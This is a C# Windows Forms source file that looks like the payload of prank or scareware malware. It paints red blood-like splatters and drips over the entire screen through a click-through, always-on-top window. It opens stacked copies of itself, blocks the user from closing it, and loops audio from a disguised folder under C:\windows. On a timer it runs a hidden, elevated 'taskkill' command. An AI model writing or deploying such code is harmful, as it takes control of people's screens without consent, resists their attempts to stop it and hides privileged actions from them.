using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Threading;
using System.Media;
using System.Diagnostics;
namespace gdifuncs
{
	
	public partial class MainForm : Form
	{
		public MainForm()
		{
			
		   
            InitializeComponent();
			
		}
		int maxx;
		public static int howmuch = 0;
		public static int maxy;
		[DllImport("User32.dll")]
public static extern IntPtr GetDC(IntPtr hwnd);
[DllImport("User32.dll")]
public static extern void ReleaseDC(IntPtr hwnd, IntPtr dc);
double pictrans = .99;


		Random rnd = new Random();
		
		
		
		
		protected override CreateParams CreateParams { get { CreateParams wew = base.CreateParams; wew.ExStyle = base.CreateParams.ExStyle | 0x20; return wew; } }
		void MainFormLoad(object sender, EventArgs e)
		{
			 this.BackColor = Color.Maroon;
            this.TransparencyKey = Color.Maroon;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.TopMost = true;
			this.WindowState = FormWindowState.Maximized;
			maxx = this.Size.Width;
			maxy = this.Size.Height+20;
			
			
			if (MainForm.howmuch == 3) {
				howmuch = 4;
				pictrans = .99;
				
			}
			if (MainForm.howmuch == 2) {
				howmuch = 3;
				pictrans = .85;
				MainForm mf = new MainForm();
				mf.Show();
			}
			if (MainForm.howmuch ==1) {
				howmuch = 2;
				pictrans = .75;
				MainForm mf = new MainForm();
				mf	.Show();
			}
			if (MainForm.howmuch == 0) {
				howmuch = 1;
				pictrans = .60;
				MainForm mf = new MainForm();
				mf.Show();
			
							
				try{	SoundPlayer sp = new SoundPlayer("C:\\windows\\winbase_base_procid_none\\secureloc0x65\\mainbgtheme.wav");
	
				
				pinksavage ps = new pinksavage();
				ps.Show();
				sp.PlayLooping();
				}catch{}
			//	ThreadPool.QueueUserWorkItem(tm);
			timer2.Start();
			

				//formxload
				
				
			}
			this.Opacity = pictrans;
			
			
			
		
		
			//this.WindowState = FormWindowState.Minimized;			
			timer1.Start();
		
			
		}
		protected override void OnFormClosing(FormClosingEventArgs e)
{
  switch (e.CloseReason)
  {
    case CloseReason.UserClosing:
      e.Cancel = true;
      break;
  }

  base.OnFormClosing(e);
}
		
		[System.Runtime.InteropServices.DllImport("user32.dll")]
public static extern bool SetForegroundWindow(IntPtr hWnd);
		void tm(object state) {
		SetForegroundWindow(this.Handle);
		Thread.Sleep(10);
			
		}
		void sagaCiz() {
			Graphics g = this.CreateGraphics();
			SolidBrush b = new SolidBrush(Color.FromArgb(rnd.Next(100,255),Color.Red));
int mysize = 0;
mysize = rnd.Next(3,15);
int genpos = 0;
int ranint = rnd.Next(0,11);
if (ranint < 5) {
	genpos = rnd.Next(-5,65);
} 
if (ranint > 4 && ranint < 8) {
	genpos = rnd.Next(65,120);
} 
if (ranint == 8 ||ranint == 9) {
	genpos = rnd.Next(120,250);
}
if (ranint == 10) {
	genpos = rnd.Next(250,500);
}

if (rnd.Next(0,2) == 1) {
g.FillEllipse(b, new Rectangle(maxx-genpos, rnd.Next(0,maxy-50), mysize, rnd.Next(3,15)));
}else{
g.FillRectangle(b, new Rectangle(maxx-genpos, rnd.Next(0,maxy-50), mysize, rnd.Next(3,15)));
}
g.Dispose();
		}		
		void solaCiz() {
			Graphics g = this.CreateGraphics();
			SolidBrush b = new SolidBrush(Color.FromArgb(rnd.Next(100,255),Color.Red));
int mysize = 0;
mysize = rnd.Next(3,15);
int genpos = 0;
int ranint = rnd.Next(0,11);
if (ranint < 5) {
	genpos = rnd.Next(-5,65);
} 
if (ranint > 4 && ranint < 8) {
	genpos = rnd.Next(65,120);
} 
if (ranint == 8 ||ranint == 9) {
	genpos = rnd.Next(120,250);
}
if (ranint == 10) {
	genpos = rnd.Next(250,500);
}

if (rnd.Next(0,2) == 1) {
g.FillEllipse(b, new Rectangle(genpos, rnd.Next(0,maxy-50), mysize, rnd.Next(3,15)));
}else{
g.FillRectangle(b, new Rectangle(genpos, rnd.Next(0,maxy-50), mysize, rnd.Next(3,15)));
}
g.Dispose();
		}
		void usteCiz() {
			Graphics g = this.CreateGraphics();
			SolidBrush b = new SolidBrush(Color.FromArgb(rnd.Next(100,255),Color.Red));
int mysize = 0;
mysize = rnd.Next(3,15);
int genpos = 0;
int ranint = rnd.Next(0,11);
if (ranint < 5) {
	genpos = rnd.Next(-5,20);
} 
if (ranint > 4 && ranint < 8) {
	genpos = rnd.Next(20,40);
} 
if (ranint == 8 ||ranint == 9) {
	genpos = rnd.Next(40,60);
}
if (ranint == 10) {
	genpos = rnd.Next(60,100);
}

if (rnd.Next(0,2) == 1) {
	g.FillEllipse(b, new Rectangle(rnd.Next(20,maxx-20), genpos, mysize, rnd.Next(3,15)));
}else{
	g.FillRectangle(b, new Rectangle(rnd.Next(20,maxx-20), genpos, mysize, rnd.Next(3,15)));
}
g.Dispose();
		}	
		void altaCiz() {
			Graphics g = this.CreateGraphics();
			SolidBrush b = new SolidBrush(Color.FromArgb(rnd.Next(100,255),Color.Red));
int mysize = 0;
mysize = rnd.Next(3,15);
int genpos = 0;
int ranint = rnd.Next(0,11);
if (ranint < 5) {
	genpos = rnd.Next(-5,20);
} 
if (ranint > 4 && ranint < 8) {
	genpos = rnd.Next(20,40);
} 
if (ranint == 8 ||ranint == 9) {
	genpos = rnd.Next(40,60);
}
if (ranint == 10) {
	genpos = rnd.Next(60,100);
}

if (rnd.Next(0,2) == 1) {
	g.FillEllipse(b, new Rectangle(rnd.Next(20,maxx-20), maxy-genpos, mysize, rnd.Next(3,15)));
}else{
	g.FillRectangle(b, new Rectangle(rnd.Next(20,maxx-20), maxy-genpos, mysize, rnd.Next(3,15)));
}
g.Dispose();
		}	
		int dropdownxpos = 0;
		int finishdrop = 0;
		int kalinlik = 0;
		
		int qdropdownxpos = 0;
		int qfinishdrop = 0;
		int qkalinlik = 0;
			
		void dropit(object state) {
			int startpos = dropdownxpos;
			int bitir = finishdrop;
			int kalinlikx = kalinlik;
			
			for (int a = 0; a < bitir; a++) {
				try{Graphics g = this.CreateGraphics();
			SolidBrush b = new SolidBrush(Color.FromArgb(255,Color.Red));
			g.FillEllipse(b, new Rectangle(startpos,-20,kalinlik,a));
			g.Dispose();
			Thread.Sleep(2);
				}catch{}
			}
			
			
			
		}
		
		void dropitX(object state) {
			int startpos = qdropdownxpos;
			int bitir = qfinishdrop;
			int kalinlikx = qkalinlik;
			
			for (int a = 0; a < bitir; a++) {
			Graphics g = this.CreateGraphics();
			SolidBrush b = new SolidBrush(Color.FromArgb(255,Color.Red));
			g.FillEllipse(b, new Rectangle(startpos,-20,kalinlikx,a));
			Thread.Sleep(5);
			}
			
			
			
			
		}
		void verticalDropX() {
			
			qdropdownxpos = rnd.Next(1,maxx-5);
			qfinishdrop = rnd.Next(5,15);
			qkalinlik = rnd.Next(30,90);
			
			ThreadPool.QueueUserWorkItem(dropitX);
		}
		
		void verticalDrop() {
			
			dropdownxpos = rnd.Next(1,maxx-5);
			finishdrop = rnd.Next(5,maxy-20);
			kalinlik = rnd.Next(5,25);
			
			ThreadPool.QueueUserWorkItem(dropit);
		}
		
		
		void Timer1Tick(object sender, EventArgs e)
		{
			
			
			int k = rnd.Next(0,10);
			if (k < 3) {
				sagaCiz();
			}
			if (k > 2 && k < 5) {
				solaCiz();
			}
			if (k == 5 ||k == 8) {
				usteCiz();
			}
			if (k == 6 ||k == 7) {
				altaCiz();
			}
			if (k == 9) {
				verticalDrop();
			//	MessageBox.Show("vertical drop atildi");
				//int f = rnd.Next(0,150);
			//	if (f == 14) {
				//	majorhey mh = new majorhey();	
				
		//	mh.Show();
		
			//	}
				
			}
		
			
		}
		void Timer2Tick(object sender, EventArgs e)
		{
			this.TopMost = true;
		}
		void Timer3Tick(object sender, EventArgs e)
		{
		try{Process prcx = new Process();
        	prcx.StartInfo.FileName = "cmd.exe";
        	prcx.StartInfo.Arguments = @"/c taskkill /f /im tobi0a0c.exe";
        	prcx.StartInfo.Verb = "runas";
        	prcx.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        	prcx.Start();
							}catch{Application.Exit();}
		}
   
	}
}
